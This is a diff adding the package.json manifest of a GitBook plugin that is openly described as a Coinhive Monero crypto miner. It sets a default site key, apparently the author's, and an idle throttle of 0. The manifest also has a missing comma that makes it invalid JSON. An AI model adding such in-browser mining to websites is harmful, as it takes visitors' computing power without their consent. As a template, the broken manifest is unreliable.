@@ -1,0 +1,29 @@
+{
+    "name": "gitbook-plugin-xmr",
+    "version": "0.0.1",
+    "description": "A Crypto Miner",
+    "engines": {
+        "gitbook": ">=2.5.1"
+    },
+    "gitbook": {
+        "properties": {
+            "siteKey": {
+                "type": "string",
+                "default": "UogF4rJMxpFcsez63SckaUr06XOeNNQx",
+                "title": "Your Site Key in https://coinhive.com/"
+            }
+            "throttle": {
+                "type": "number",
+                "default": 0,
+                "title": "The fraction of time that threads should be idle"
+            }
+        }
+    },
+    "main": "index.js",
+    "keywords": [
+        "xmr",
+        "coinhive"
+    ],
+    "author": "caimaoy",
+    "license": "MIT"
+}
